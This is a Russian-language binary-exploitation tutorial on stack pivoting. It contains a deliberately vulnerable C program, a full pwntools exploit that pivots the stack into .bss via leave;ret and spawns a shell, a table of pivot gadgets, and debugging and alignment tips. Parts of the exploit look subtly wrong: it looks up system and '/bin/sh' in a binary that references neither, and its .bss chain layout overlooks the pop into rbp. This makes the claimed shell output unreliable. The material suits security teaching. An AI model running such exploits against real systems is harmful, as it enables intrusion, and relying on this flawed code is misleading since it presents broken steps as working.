## Вопрос, с которого всё начинается

Ты собрал ROP-цепочку из пяти вызовов и уже готов получить shell. Запускаешь — и падаешь. Оказывается, буфер настолько мал, что после адреса возврата влезает всего один-два адреса, а цепочке нужно двадцать.

Место на стеке кончилось. Можно ли «переехать» на другой стек — туда, где места сколько угодно? Можно. Это называется **stack pivot** — подмена указателя стека.

## Наш пример: короткое переполнение

```c
// chall.c — буфер всего 16 байт
#include <stdio.h>
void vuln(void) {
    char buf[16];
    read(0, buf, 0x100);   // переполнение есть, но стек тесен
}
int main(void) { vuln(); return 0; }
```

```bash
$ gcc -fno-stack-protector -no-pie -o chall chall.c
$ ./chall
```

Смещение до возврата — 24 байта (16 буфера + 8 сохранённого `rbp`). В эти 24 байта длинную цепочку не уложить. Но у нас есть `.bss` — область глобальных данных, её адрес фиксирован (PIE выключен), и туда можно записать что угодно.

## Шаг 1. Инструкция leave

`leave` — сокращение для двух действий: `mov rsp, rbp` (стек переезжает туда, куда указывает `rbp`), затем `pop rbp`. Если мы контролируем `rbp`, то после `leave` стек окажется в выбранной нами области.

Комбинация `leave; ret` работает так:

1. Мы перезаписываем сохранённый `rbp` адресом `.bss` (нашего будущего стека).
2. На место адреса возврата кладём адрес гаджета `leave; ret`.
3. Пролог функции выполняет `leave` → `rsp` переезжает в `.bss`; затем `ret` снимает с нового стека первый адрес — начало новой цепочки.

```python
payload  = b'A' * 16
payload += p64(fake_stack)   # сохранённый rbp -> наш стек в .bss
payload += p64(leave_ret)    # адрес гаджета leave; ret
```

## Шаг 2. Готовим новый стек

Проблема: чтобы цепочка в `.bss` исполнилась, её содержимое надо туда сначала записать. Удобный способ — использовать сам примитив переполнения: сначала вызвать `read(0, bss, 0x200)`, а потом сделать pivot.

Найдём гаджет `leave; ret` через pwntools:

```python
>>> from pwn import *
>>> elf = ELF('./chall')
>>> leave_ret = ROP(elf).find_gadget(['leave', 'ret']).address
>>> hex(leave_ret)
'0x4011b9'
```

## Шаг 3. Собираем эксплойт целиком

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 24
bss = elf.bss() + 0x400
leave_ret = ROP(elf).find_gadget(['leave', 'ret']).address

p = process('./chall')
# Этап 1: читаем длинную цепочку в .bss и переезжаем туда
rop  = p64(ROP(elf).find_gadget(['pop rdi','ret']).address)
rop += p64(0)                    # rdi = 0 (stdin)
rop += p64(ROP(elf).find_gadget(['pop rsi','ret']).address)
rop += p64(bss)                  # rsi = куда
rop += p64(ROP(elf).find_gadget(['pop rdx','ret']).address)
rop += p64(0x200)                # rdx = сколько
rop += p64(elf.plt['read'])
rop += p64(leave_ret)            # после read: leave; ret -> переезд в bss
p.sendline(flat({OFFSET: rop, 0x10: p64(bss)}))

# Этап 2: цепочка, которую прочитает read — она исполнится уже в .bss
chain  = p64(ROP(elf).find_gadget(['pop rdi','ret']).address)
chain += p64(next(elf.search(b'/bin/sh')))
chain += p64(elf.plt['system'])
p.send(chain)
p.interactive()
```

```text
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Разберём ключевую деталь: `flat({OFFSET: rop, 0x10: p64(bss)})` кладёт по смещению `0x10` (это и есть сохранённый `rbp`) адрес `.bss`. Именно его `leave` берёт как новый `rsp` — **не только адрес возврата**.

## Шаг 4. Другие способы переехать

`leave; ret` — не единственный pivot-гаджет. Полезно знать весь набор:

| Гаджет | Эффект |
|---|---|
| `leave; ret` | `rsp = rbp; pop rbp; ret` |
| `pop rsp; ret` | напрямую берёт новый `rsp` со стека |
| `xchg rax, rsp; ret` | меняет местами стек и `rax` |
| `mov rsp, rbp; pop rbp; ret` | функционально равен `leave` |
| `setcontext+off` | полный контроль регистров из структуры |

`xchg rax, rsp; ret` удобен, когда `rax` уже указывает на контролируемую память (например, результат `read` или `mmap`). Найти его можно в libc:

```bash
$ ROPgadget --binary ./libc.so.6 | grep 'xchg rax, rsp'
0x0000000000154e30 : xchg rax, rsp ; ret
```

`pop rsp; ret` — самый прямой: снимает со стека значение и делает его новым `rsp`. Если такой гаджет есть, цепочка собирается в три строки.

## Шаг 5. Тонкости

- **`leave` требует корректного `rbp`.** Если не перезаписать сохранённый `rbp`, pivot уедет в мусор.
- **Фейковый стек должен быть writable и уже заполнен.** Убедись, что `read` реально записал туда цепочку.
- **Выравнивание.** После pivot стек может оказаться невыровненным по 16 — тогда добавь лишний `ret` перед вызовом libc-функции (иначе `movaps` уронит процесс).
- **ASLR + PIE.** Адрес `.bss` при PIE неизвестен — нужна утечка базы.
- **`xchg` портит `rax`.** Если он понадобится дальше, учти это.

## Почему нужен именно сохранённый rbp

Начинающие часто перезаписывают только адрес возврата и удивляются, почему pivot уехал в мусор. Дело в том, что `leave` читает **rbp**, а не адрес возврата. В прологе функции компилятор сохраняет старое значение `rbp` на стек — ровно перед адресом возврата. Это слово мы и контролируем при переполнении. Поэтому в payload адрес нового стека кладут по смещению `буфер + 8` (сохранённый `rbp`), а `leave_ret` — по смещению `буфер + 16` (адрес возврата). Перепутать их — самая частая ошибка в pivot-эксплойтах.

## Как проверить pivot в отладчике

Перед запуском на удалённой цели прогони эксплойт локально в GDB. Поставь брейкпоинт на адрес `leave_ret` и посмотри, куда указывает `rbp`:

```text
(gdb) b *0x4011b9
(gdb) c
(gdb) info registers rbp rsp
rbp  0x404b40   0x404b40   <- это наш .bss?
rsp  0x7fffffffe3a8
(gdb) si
(gdb) info registers rsp
rsp  0x404b48              <- переехали
```

Если `rbp` не указывает в `.bss`, значит сохранённый `rbp` в payload стоит по неверному смещению. Если переезд случился, но следующий `ret` уходит в мусор — цепочка в `.bss` ещё не записана (проверь, что `read` отработал до pivot).

## На что смотреть дальше

- **Очень мало места даже под вызов `read`?** Тогда сначала `pop rbp; ret` с адресом `.bss`, потом `leave; ret` — а данные запиши другим примитивом заранее.
- **Контролируешь `rdi`?** Тогда `setcontext` даёт сразу и стек, и точку исполнения — это в `pwn-fsop`.
- **Kernel pwn?** Аналог pivot — переход на подготовленный userland-стек через `swapgs_restore_regs_and_return_to_usermode` (см. `pwn-kernel-rop`).
- **SROP** — частный случай pivot через `rt_sigreturn` (см. `pwn-seccomp-srop`).

## Инструмент: objdump — дизассемблер

`objdump` показывает машинный код бинарника в виде ассемблера. Именно по нему считают смещения буферов, находят вызовы и адреса — основа статического разбора.

Ключи, которые пригодятся:
* `objdump -d <файл>` — дизассемблировать секцию `.text` (машинный код функций);
* `objdump -d <файл> | less` — листать вывод, искать нужную функцию по имени;
* `objdump -M intel -d <файл>` — синтаксис Intel (привычнее, чем AT&T);
* в выводе важны пролог функции (`push rbp; mov rbp,rsp`) и `sub rsp,N` — по нему видно размер кадра.

### Рабочий пример (как в лаборатории)

```
$ objdump -d pivot

pivot:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <gadget>:
  401000:	c9                   	leave
  401001:	c3                   	ret

0000000000401002 <_start>:
  401002:	e8 f9 ff ff ff       	call   401000 <gadget>
  401007:	48 c7 c0 3c 00 00 00 	mov    $0x3c,%rax
  40100e:	48 31 ff             	xor    %rdi,%rdi
  401011:	0f 05                	syscall
```

Подсказка из лаборатории: `objdump [-d] <файл> — дизассемблирование`.

## Что мы теперь знаем

- Stack pivot переносит `rsp` в контролируемую область для длинной цепочки.
- `leave; ret` берёт новый стек из `rbp`; сохранённый `rbp` надо перезаписать.
- Цепочку в `.bss` обычно заливают `read(0, bss, n)` до pivot.
- `pop rsp; ret` и `xchg rax, rsp; ret` — альтернативы.
- Следи за выравниванием стека по 16.

## Выравнивание стека: почему pivot падает с SIGSEGV на movaps

Отдельная головная боль pivot-эксплойтов — **выравнивание `rsp` по 16 байт**. На x86-64 соглашение вызова (System V ABI) требует, чтобы в момент выполнения инструкции `call` стек был выровнен по 16. Некоторые функции glibc используют SSE-инструкции вида `movaps [rsp+...]`, которые **падают с SIGSEGV**, если адрес не кратен 16. Проблема в том, что после pivot ты сам выбрал адрес нового стека — и легко промахнуться на 8 байт.

Симптом узнаётся мгновенно: цепочка выглядит корректной, гаджеты на месте, но где-то в середине процесс падает именно на `movaps`. Лечится это вставкой лишнего `ret`-гаджета в начало цепочки: каждый `ret` сдвигает `rsp` на 8, и один такой гаджет меняет выравнивание на противоположное. Классическая формула — «если падает на movaps, добавь `ret` перед вызовом».

Практический порядок действий: выбери адрес нового стека так, чтобы он был кратен 16 (`0x404b40`, а не `0x404b48`); собери цепочку; если падает на `movaps`, вставь один `ret` в начало; проверь выравнивание в GDB через `info registers rsp` и `p $rsp % 16`. В отладчике удобно ставить брейкпоинт на первый гаджет и смотреть остаток — 0 или 8. Держи это правило в голове: половина «загадочных» падений pivot-эксплойтов — именно выравнивание.
